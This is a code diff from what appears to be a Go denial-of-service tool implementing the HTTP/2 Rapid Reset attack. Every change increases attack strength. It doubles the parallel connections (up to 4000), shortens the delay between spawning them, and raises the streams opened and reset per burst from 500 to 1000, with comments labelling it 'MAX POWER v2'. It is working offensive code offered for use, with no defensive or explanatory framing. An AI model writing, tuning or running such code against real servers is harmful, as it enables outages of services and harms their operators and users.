@@ -32,8 +32,8 @@ func runRapidReset(cfg *AttackConfig) {
 		return
 	}
 
-	// MAX POWER: massive parallel connections (no upper cap that wastes hardware)
-	connCount := cfg.Threads
+	// MAX POWER: massive parallel connections
+	connCount := cfg.Threads * 2
 	if connCount < 100 {
 		connCount = 200
 	}
@@ -41,16 +41,14 @@ func runRapidReset(cfg *AttackConfig) {
 		connCount = 4000
 	}
 
-	log.Printf("RapidReset: %d parallel H2 connections, target %s:%s%s (MAX POWER mode)", connCount, host, port, path)
+	log.Printf("RapidReset: %d parallel H2 connections, target %s:%s%s (MAX POWER v2)", connCount, host, port, path)
 
-	// Spawn connection pool with auto-respawn (no stagger - burst all at once)
 	var wg sync.WaitGroup
 	for i := 0; i < connCount; i++ {
 		wg.Add(1)
 		go connectionWorker(i, host, port, path, deadline, &wg)
-		// Light stagger only every 100 connections to avoid OS-level burst limits
-		if i%100 == 99 {
-			time.Sleep(1 * time.Millisecond)
+		if i%500 == 499 {
+			time.Sleep(500 * time.Microsecond)
 		}
 	}
 
@@ -228,8 +226,8 @@ func burstRapidReset(host, port, path string, deadline time.Time) error {
 			return nil
 		}
 
-		// MAX BURST: 500 streams per cycle (was 100)
-		for i := 0; i < 500; i++ {
+		// MAX BURST: 1000 streams per cycle (was 500)
+		for i := 0; i < 1000; i++ {
 			if streamID > 0x7FFFFFFE {
 				return nil // need fresh connection
 			}
